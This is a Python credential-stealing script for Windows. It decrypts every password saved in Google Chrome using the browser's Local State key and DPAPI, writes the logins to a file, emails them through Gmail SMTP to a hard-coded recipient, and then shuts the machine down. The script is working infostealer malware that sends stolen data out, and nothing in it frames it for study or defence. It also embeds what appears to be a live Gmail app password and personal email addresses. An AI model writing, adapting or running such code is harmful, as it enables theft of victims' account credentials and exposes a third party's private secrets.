# Import required libraries
import os  # For file and path operations
import re  # For regex operations
import json  # To parse JSON data
import base64  # For decoding Base64 encoded data
import sqlite3  # To interact with SQLite databases
import win32crypt  # To decrypt data encrypted by Windows
from Cryptodome.Cipher import AES  # For AES decryption
import shutil  # For file copying
from email.mime.multipart import MIMEMultipart  # To create email messages
from email.mime.text import MIMEText  # For plain-text email parts
from email.mime.base import MIMEBase  # For email attachments
from email import encoders  # For encoding email attachments
import smtplib  # To send emails

# GLOBAL CONSTANTS
# Path to Chrome's "Local State" file, which contains the encrypted secret key
LOCAL_STATE_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))

# Path to Chrome's user data directory
CHROME_USER_DATA_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

# Output filename where extracted passwords will be saved
OUTPUT_FILENAME = "chrome_passwords.txt"

# Function to retrieve the secret encryption key from Chrome's Local State file
def retrieve_secret_key():
    try:
        # Open and parse the Local State JSON file
        with open(LOCAL_STATE_PATH, "r", encoding='utf-8') as file:
            local_state = json.load(file)
        
        # Decode the Base64 encoded key and remove the DPAPI prefix
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        
        # Decrypt the key using Windows' CryptUnprotectData API
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        # Handle errors and return None
        print(f"[ERROR] Unable to retrieve secret key: {e}")
        return None

# Function to decrypt an encrypted Chrome password
def decrypt_chrome_password(encrypted_password, secret_key):
    try:
        # Extract the initialization vector (IV) and ciphertext
        iv = encrypted_password[3:15]
        ciphertext = encrypted_password[15:-16]
        
        # Decrypt the password using AES
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(ciphertext).decode()
    except Exception as e:
        # Handle decryption errors
        return f"[ERROR] Unable to decrypt password: {e}"

# Function to extract saved passwords from Chrome
def extract_chrome_passwords():
    try:
        # Retrieve the secret encryption key
        secret_key = retrieve_secret_key()
        if not secret_key:
            return "[ERROR] Unable to fetch secret key."
        
        # Open the output file to write extracted credentials
        with open(OUTPUT_FILENAME, "w", encoding="utf-8") as output_file:
            # List all Chrome user profiles (e.g., "Default", "Profile X")
            profiles = [profile for profile in os.listdir(CHROME_USER_DATA_PATH) if re.match(r"^Profile.*|Default$", profile)]
            
            for profile in profiles:
                # Construct the path to the Login Data SQLite database
                login_data_path = os.path.join(CHROME_USER_DATA_PATH, profile, "Login Data")
                if not os.path.exists(login_data_path):
                    continue  # Skip if the database file does not exist
                
                # Copy the database file to a temporary location
                shutil.copy(login_data_path, "temp_Loginvault.db")
                
                # Connect to the SQLite database
                conn = sqlite3.connect("temp_Loginvault.db")
                cursor = conn.cursor()
                
                # Query for saved URLs, usernames, and encrypted passwords
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                # Iterate over the results
                for url, username, encrypted_password in cursor.fetchall():
                    if url and username and encrypted_password:
                        # Decrypt the password
                        decrypted_password = decrypt_chrome_password(encrypted_password, secret_key)
                        
                        # Write the credentials to the output file
                        output_file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
                
                # Close the database connection and remove the temporary file
                cursor.close()
                conn.close()
                os.remove("temp_Loginvault.db")
        
        print(f"Passwords saved to {OUTPUT_FILENAME}")
    except Exception as e:
        # Handle any errors that occur during extraction
        return f"[ERROR] An error occurred: {e}"

# Function to send an email with the extracted passwords as an attachment
def send_email_with_file(attachment_path, recipient_email):
    try:
        # Email credentials (sender's email and password)
        sender_email = "barcelo.divinakarla@gmail.com"
        sender_password = "aluk insm peke xkss"
        
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = "Chrome Passwords Backup"
        msg.attach(MIMEText("Attached are the extracted Chrome passwords.", 'plain'))
        
        # Attach the output file
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
        msg.attach(part)
        
        # Connect to Gmail's SMTP server and send the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        
        print("Email sent successfully.")
    except Exception as e:
        # Handle errors during email sending
        print(f"[ERROR] Failed to send email: {e}")
        return False
    return True

# Function to shut down the computer
def shutdown_computer():
    try:
        # Execute the system shutdown command
        print("Shutting down the system...")
        os.system("shutdown /s /t 0")  # Windows shutdown command
    except Exception as e:
        # Handle errors during shutdown
        print(f"[ERROR] Failed to shut down the system: {e}")

# Main execution block
if __name__ == "__main__":
    try:
        # Extract Chrome passwords
        extract_chrome_passwords()
        
        # Send the extracted passwords via email
        if send_email_with_file(OUTPUT_FILENAME, "divinakarlaaaa@gmail.com"):
            # Shut down the computer if the email was sent successfully
            shutdown_computer()
    except Exception as e:
        # Handle errors during script execution
        print(f"[ERROR] An error occurred during execution: {e}")
